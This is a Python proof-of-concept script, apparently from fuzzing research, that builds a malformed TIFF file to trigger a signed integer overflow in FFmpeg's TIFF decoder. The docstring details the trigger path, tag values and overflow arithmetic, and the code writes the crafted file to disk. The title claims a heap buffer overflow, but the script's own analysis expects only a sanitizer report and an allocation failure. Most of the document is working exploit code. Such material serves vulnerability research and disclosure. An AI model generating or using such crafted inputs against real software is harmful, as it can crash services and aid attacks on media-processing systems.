#!/usr/bin/env python3
"""
Vulnerability PoC Generator - VULN 001
Heap Buffer Overflow via Integer Overflow in five_planes Allocation
for PHOTOMETRIC_SEPARATED TIFF

Target:  FFmpeg libavcodec/tiff.c decode_frame() lines 2215-2219
CWE:     CWE-190 -> CWE-122
Binary:  /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

Trigger path:
  ffmpeg -i vuln_001_input.tiff -f null -
  -> avformat_open_input()
  -> tiff_decode() / decode_frame()
  -> init_image(): bpp=40, bppcount=5, photometric=SEPARATED -> pix_fmt=AV_PIX_FMT_RGBA
  -> av_image_alloc() succeeds (width=107374182, AV_PIX_FMT_RGBA, ~1.7 GB frame)
  -> stride = p->linesize[0] = FFALIGN(107374182*4, 32) = 429496736
  -> stride = stride * 5 / 4  <- SIGNED INTEGER OVERFLOW (2147483680 > INT32_MAX)
  -> av_malloc(stride * height) called with overflowed stride

Analysis of the integer overflow:
  stride before = 429496736
  stride * 5    = 2,147,483,680 (exceeds INT32_MAX = 2,147,483,647 by 33)
  UB result     = -2,147,483,616 (signed wraparound on typical platforms)
  divided by 4  = -536,870,904  (negative stride)
  av_malloc(-536870904 * 4) -> fails with ENOMEM (huge size_t)
  UBSAN catches the signed integer overflow at the multiplication site.

Switch key in init_image():
  planar * 10000 + bpp * 10 + bppcount + is_bayer * 100000
  = 0 + 40*10 + 5 + 0 = 405  -> case 405: pix_fmt = AV_PIX_FMT_RGBA

TIFF IFD tags required:
  256 (ImageWidth)              = 107374182
  257 (ImageLength)             = 4
  258 (BitsPerSample)           = [8,8,8,8,8]  (5 x SHORT, stored at offset)
  259 (Compression)             = 1 (TIFF_RAW, no compression)
  262 (PhotometricInterpretation) = 5 (TIFF_PHOTOMETRIC_SEPARATED / CMYK+extra)
  273 (StripOffsets)            = <offset to strip data>
  277 (SamplesPerPixel)         = 5
  278 (RowsPerStrip)            = 4
  279 (StripByteCounts)         = 4
  338 (ExtraSamples)            = 0 (unspecified extra sample)
"""

import struct
import os
import sys

OUTPUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_tiff_c'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'vuln_001_input.tiff')


def pack_entry(tag, typ, count, val_or_offset):
    """
    Pack a 12-byte TIFF IFD entry (little-endian).
    Format: tag(2) type(2) count(4) value_or_offset(4)
    For SHORT type with count=1, value stored in low 2 bytes of the 4-byte field.
    """
    return struct.pack('<HHII', tag, typ, count, val_or_offset & 0xFFFFFFFF)


def make_tiff():
    SHORT = 3  # TIFF type: 2-byte unsigned integer
    LONG  = 4  # TIFF type: 4-byte unsigned integer

    # Width chosen so that linesize[0]*5 overflows int32:
    #   linesize[0] = FFALIGN(width * 4, 32)
    #               = FFALIGN(429496728, 32)
    #               = 429496736
    #   429496736 * 5 = 2147483680 > INT32_MAX (2147483647) -> OVERFLOW
    width  = 107374182
    height = 4

    # File layout (little-endian TIFF):
    #   Offset   0: Header        (8 bytes)
    #   Offset   8: IFD           (2 + 10*12 + 4 = 126 bytes)
    #   Offset 134: BitsPerSample data  (5 x SHORT = 10 bytes)
    #   Offset 144: Strip data    (4 bytes of zeros)
    #   Total: 148 bytes

    n_entries      = 10
    ifd_offset     = 8
    ifd_size       = 2 + n_entries * 12 + 4   # 126
    bps_data_offset = ifd_offset + ifd_size    # 134
    strip_offset   = bps_data_offset + 10      # 144
    strip_size     = 4

    # ---- TIFF Header ----
    # 'II' = little-endian, 42 = TIFF magic, IFD offset
    header = b'II' + struct.pack('<HI', 42, ifd_offset)

    # ---- IFD entries (must be sorted by tag number ascending) ----
    entries = b''
    entries += pack_entry(256, LONG,  1, width)            # ImageWidth
    entries += pack_entry(257, LONG,  1, height)           # ImageLength
    entries += pack_entry(258, SHORT, 5, bps_data_offset)  # BitsPerSample -> 5 SHORTs at offset
    entries += pack_entry(259, SHORT, 1, 1)                # Compression = 1 (TIFF_RAW)
    entries += pack_entry(262, SHORT, 1, 5)                # PhotometricInterpretation = SEPARATED
    entries += pack_entry(273, LONG,  1, strip_offset)     # StripOffsets
    entries += pack_entry(277, SHORT, 1, 5)                # SamplesPerPixel = 5
    entries += pack_entry(278, LONG,  1, height)           # RowsPerStrip
    entries += pack_entry(279, LONG,  1, strip_size)       # StripByteCounts
    entries += pack_entry(338, SHORT, 1, 0)                # ExtraSamples = 0 (unspecified)

    assert len(entries) == n_entries * 12, \
        f"IFD entries length mismatch: expected {n_entries*12}, got {len(entries)}"

    # IFD: entry count + entries + next-IFD pointer (0 = no more IFDs)
    ifd = struct.pack('<H', n_entries) + entries + struct.pack('<I', 0)
    assert len(ifd) == ifd_size, \
        f"IFD size mismatch: expected {ifd_size}, got {len(ifd)}"

    # ---- BitsPerSample data: 5 x SHORT = 8 ----
    bps_data = struct.pack('<HHHHH', 8, 8, 8, 8, 8)   # 10 bytes

    # ---- Strip data: minimal 4 zero bytes ----
    # The overflow and UBSAN trigger happen before tiff_unpack_strip is called,
    # so the actual strip content is irrelevant.
    strip_data = b'\x00' * strip_size

    tiff = header + ifd + bps_data + strip_data

    expected_size = 8 + ifd_size + 10 + strip_size  # 148 bytes
    assert len(tiff) == expected_size, \
        f"Total size mismatch: expected {expected_size}, got {len(tiff)}"

    return tiff


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    tiff_data = make_tiff()

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(tiff_data)

    print(f"[+] Written {len(tiff_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] Width={107374182}, Height=4, SamplesPerPixel=5, BitsPerSample=8x5")
    print(f"[+] PhotometricInterpretation=5 (SEPARATED), Compression=1 (RAW)")
    print()
    print(f"[*] Expected behavior (ASAN+UBSAN build):")
    print(f"    linesize[0] = FFALIGN({107374182}*4, 32) = 429496736")
    print(f"    stride * 5  = 2147483680 > INT32_MAX -> UBSAN: signed integer overflow")
    print(f"    av_malloc(overflowed_value * 4) -> ENOMEM (huge size_t on 64-bit)")


if __name__ == '__main__':
    main()
